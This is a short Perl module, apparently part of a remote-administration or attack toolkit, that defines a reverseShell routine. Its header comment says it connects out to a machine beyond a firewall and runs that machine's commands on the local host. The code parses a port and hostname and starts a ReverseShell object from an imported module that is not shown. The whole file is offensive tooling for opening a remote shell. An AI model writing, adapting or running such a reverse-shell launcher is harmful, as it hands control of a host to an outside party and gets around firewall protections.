# ----------------------------------
# class Remote::reverseShell
# Description:
#    start up a process that attempts
#    to connect to a machine outside 
#    of a firewall. Execute any
#    commands from that machine on the
#    local host
#
# Usage: buildRemote -p port hostname
#-----------------------------------


package Remote::reverseShell;
use ReverseShell;
use strict;
1;

sub reverseShell {
    my $remoteApi=shift;
    my $port;
    while( $_[0]=~/^-(.*)/ ) {
        shift @_;
        if($1 eq "p" ) {
            $port=shift @_;
            next;
        }
    }
    my $host=shift @_;
    my $rs=ReverseShell->new($port,$host);
    $rs->start();
}

